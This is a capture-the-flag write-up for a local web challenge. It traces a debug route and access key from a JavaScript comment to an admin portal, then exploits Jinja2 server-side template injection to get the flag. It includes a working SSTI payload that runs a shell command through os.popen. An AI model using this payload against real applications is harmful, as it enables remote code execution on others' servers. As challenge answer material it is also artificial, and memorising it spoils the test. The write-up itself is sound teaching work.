# Challenge 05 Writeup: The Broken Application

## Category
Web Security

## Difficulty
Hard (300 Points)

## Learning Objective
Master multi-stage web application security assessments: reconnaissance, JavaScript analysis, hidden API discovery, authorization bypass, and Server-Side Template Injection (SSTI).

## Tools Required
- Web Browser & Developer Tools (F12)
- cURL / Python `requests` / CyberChef

## Target URL
`http://localhost:5005`

## Multi-Stage Solution Steps

### Step 1: Reconnaissance
Navigate to `http://localhost:5005`. Inspect the rendered staging developer hub page.

### Step 2: Client-side JavaScript Analysis
Open Browser Developer Tools (`F12`) -> **Sources** or **Network** tab, or open `http://localhost:5005/static/js/app.js`.
Find the developer comment:
```javascript
/**
 * TODO: Remove legacy debug endpoint before production launch!
 * DEBUG ROUTE: /api/v1/debug_status?token=dev_preview_2026
 */
```

### Step 3: Discover Hidden Endpoint & Access Key
Visit `http://localhost:5005/api/v1/debug_status?token=dev_preview_2026`.
The API returns JSON:
```json
{
  "access_key": "dev_preview_2026",
  "admin_portal": "/admin_portal",
  "environment": "staging",
  "notice": "Access /admin_portal?access_key=dev_preview_2026 for internal report preview generation.",
  "status": "healthy"
}
```

### Step 4: Access Admin Portal & Identify Vulnerability
Navigate to `http://localhost:5005/admin_portal?access_key=dev_preview_2026`.
Observe the "Internal Admin Report Preview" form.
Test if the report title parameter is vulnerable to Server-Side Template Injection (SSTI):
Submit input: `{{ 7 * 7 }}` into the title field.
Output renders: `Report Header Output: 49`, confirming Jinja2 template execution!

### Step 5: Exploit SSTI & Capture Flag
Submit template expression to output the injected `flag` variable or file:
Submit: `{{ flag }}`
Output renders: `FLAG{multi_stage_web_investigation}`!

Alternatively, execute SSTI file read:
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}`

## Expected Observations
- Step 1: Staging home page loaded.
- Step 2: Debug route `/api/v1/debug_status?token=dev_preview_2026` discovered in JS.
- Step 3: Secret `/admin_portal` and `access_key` revealed.
- Step 4: `{{ 7*7 }}` returns `49`.
- Step 5: `{{ flag }}` extracts `FLAG{multi_stage_web_investigation}`.

## Final Flag
`FLAG{multi_stage_web_investigation}`
